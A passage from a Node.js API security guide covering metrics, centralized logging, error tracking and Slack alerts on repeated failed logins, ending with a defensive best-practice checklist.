  labelNames: ['method', 'route', 'status'],
  registers: [register]
});

const httpRequestDuration = new promClient.Histogram({
  name: 'http_request_duration_seconds',
  help: 'Duration of HTTP requests in seconds',
  labelNames: ['method', 'route', 'status'],
  registers: [register]
});

// Middleware
app.use((req, res, next) => {
  const start = Date.now();
  
  res.on('finish', () => {
    const duration = (Date.now() - start) / 1000;
    
    httpRequestCounter.inc({
      method: req.method,
      route: req.route?.path || req.path,
      status: res.statusCode
    });
    
    httpRequestDuration.observe({
      method: req.method,
      route: req.route?.path || req.path,
      status: res.statusCode
    }, duration);
  });
  
  next();
});

// Metrics endpoint
app.get('/metrics', async (req, res) => {
  res.set('Content-Type', register.contentType);
  res.end(await register.metrics());
});
```

**2. ELK Stack (Elasticsearch, Logstash, Kibana)**
```javascript
const winston = require('winston');
const { ElasticsearchTransport } = require('winston-elasticsearch');

const esTransportOpts = {
  level: 'info',
  clientOpts: { node: 'http://localhost:9200' },
  index: 'logs'
};

const logger = winston.createLogger({
  transports: [
    new ElasticsearchTransport(esTransportOpts)
  ]
});
```

**3. Sentry (error tracking)**
```javascript
const Sentry = require('@sentry/node');

Sentry.init({
  dsn: process.env.SENTRY_DSN,
  environment: process.env.NODE_ENV,
  tracesSampleRate: 1.0
});

app.use(Sentry.Handlers.requestHandler());
app.use(Sentry.Handlers.tracingHandler());

// Routes...

// Error handler (must come last)
app.use(Sentry.Handlers.errorHandler());
```

### Alerting

**Slack alerts**
```javascript
const axios = require('axios');

async function sendSlackAlert(message) {
  try {
    await axios.post(process.env.SLACK_WEBHOOK_URL, {
      text: message,
      channel: '#security-alerts'
    });
  } catch (err) {
    logger.error('Failed to send Slack alert:', err);
  }
}

// Usage: after repeated login failures
const loginAttempts = new Map();

app.post('/api/login', async (req, res) => {
  const { email } = req.body;
  const attempts = loginAttempts.get(email) || 0;
  
  if (attempts >= 5) {
    await sendSlackAlert(
      `⚠️ Security warning: 5+ failed logins for ${email} (IP: ${req.ip})`
    );
  }
  
  // Authentication logic...
});
```

### Best practices
- **Structured logging**: store logs as JSON
- **Appropriate log levels**: distinguish ERROR, WARN, INFO, and DEBUG
- **Mask sensitive data**: keep personal information out of logs
- **Log rotation**: cap log file size and count
- **Centralized logging**: manage logs from multiple servers in one place
- **Real-time alerts**: get notified immediately about important security events
- **Log retention**: keep logs for as long as regulations require

---

## Conclusion

API security isn't a single technique; it's a layered defense strategy:

### Core security elements (⭐️⭐️⭐️)
1. **Authentication & authorization**: the front line of API security - JWT, OAuth 2.0
2. **HTTPS/TLS**: encrypt all traffic - prevents man-in-the-middle attacks

### Essential techniques
3. **Rate limiting**: blocks brute-force and DDoS attacks
4. **CORS**: allow only trusted origins
5. **Injection prevention**: block SQL/NoSQL injection
6. **Firewalls**: network-level protection
7. **VPN**: protect internal resources and sensitive APIs
8. **CSRF**: token-based request verification
9. **XSS**: output escaping and CSP

### Additional hardening (⭐️⭐️)
10. **Input validation**: validate and sanitize all user input
11. **API keys & secrets**: use environment variables and a secrets manager

### Security operations (⭐️)
12. **Logging & monitoring**: detect and trace security events

### Full security checklist
- ✅ Always use HTTPS/TLS
- ✅ Strong authentication/authorization (JWT, OAuth 2.0)
- ✅ Apply rate limiting
- ✅ Configure CORS correctly
- ✅ Validate and sanitize all input
- ✅ Prevent injection with prepared statements
- ✅ Use CSRF tokens
- ✅ Defend against XSS (escaping, CSP)
- ✅ Set up firewalls and a WAF
- ✅ Manage sensitive data through environment variables
- ✅ Comprehensive logging and monitoring
- ✅ Regular security audits and vulnerability scans
- ✅ Apply the principle of least privilege

Security isn't a one-time setup; it's an ongoing process. New threats keep appearing, so you have to keep an eye on the latest security trends and keep updating.
